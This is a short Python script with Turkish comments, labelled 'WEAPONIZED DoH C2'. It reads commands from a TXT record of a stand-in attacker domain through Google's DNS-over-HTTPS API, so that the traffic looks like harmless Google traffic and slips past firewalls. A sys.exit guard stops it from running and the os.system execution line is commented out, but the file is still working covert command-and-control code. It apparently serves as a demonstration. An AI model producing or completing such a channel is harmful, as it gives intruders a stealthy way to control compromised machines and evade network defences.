import requests
import base64
import sys

# --- EMNİYET PİMİ ---
sys.exit("UYARI: Bu kod Google API üzerinden gizli iletişim kurar.")

print("--- WEAPONIZED DoH C2 ---")

def get_command_from_google():
    # 1. GİZLİ KANAL (Weaponized Part)
    # Simülasyon: requests.get("google.com")
    # Gerçek: Google DNS API'sini kullanarak TXT kaydı oku.
    
    # Hacker'ın domaini: "cmd.hacker.com"
    # Bu domainin TXT kaydında şifreli komut var: "exec:calc.exe"
    target_domain = "cmd.hacker.com"
    
    doh_url = "https://dns.google/resolve"
    params = {"name": target_domain, "type": "TXT"}
    
    print(f"[*] Google üzerinden komut bekleniyor: {target_domain}")
    
    # Trafik HTTPS (443) olduğu için Firewall 'Google Araması' sanar.
    r = requests.get(doh_url, params=params)
    
    data = r.json()
    if 'Answer' in data:
        cmd = data['Answer'][0]['data'].strip('"')
        print(f"💀 GİZLİ KOMUT ALINDI: {cmd}")
        # os.system(cmd)
    
if __name__ == "__main__":
    get_command_from_google()